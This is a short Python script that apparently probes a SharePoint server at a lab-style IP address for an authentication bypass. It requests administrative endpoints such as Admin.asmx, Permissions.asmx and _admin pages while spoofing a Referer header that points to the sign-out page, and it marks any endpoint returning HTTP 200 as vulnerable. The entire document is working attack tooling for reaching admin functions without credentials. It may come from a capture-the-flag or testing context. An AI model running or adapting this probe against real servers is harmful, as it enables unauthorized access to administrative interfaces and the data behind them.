import requests

base_url = "http://10.10.10.166"
paths = [
    "/_vti_bin/Admin.asmx",
    "/_vti_bin/Authentication.asmx",
    "/_vti_bin/UserGroup.asmx",
    "/_vti_bin/Permissions.asmx",
    "/_admin/operations.aspx",
    "/_admin/settings.aspx",
    "/_catalogs/masterpage/Forms/AllItems.aspx",
    "/Forms/Allitems.aspx",
]

for path in paths:
    headers = {"User-Agent": "Mozilla/5.0", "Referer": "/_layouts/SignOut.aspx"}
    try:
        resp = requests.get(base_url + path, headers=headers, timeout=10)
        if resp.status_code == 200:
            print(f"✓ VULNERABLE: {path} (Status: {resp.status_code})")
        elif resp.status_code == 401:
            print(f"✗ Requires auth: {path} (Status: {resp.status_code})")
        else:
            print(f"? {path} (Status: {resp.status_code})")
    except Exception as e:
        print(f"✗ {path} Error: {str(e)[:50]}")
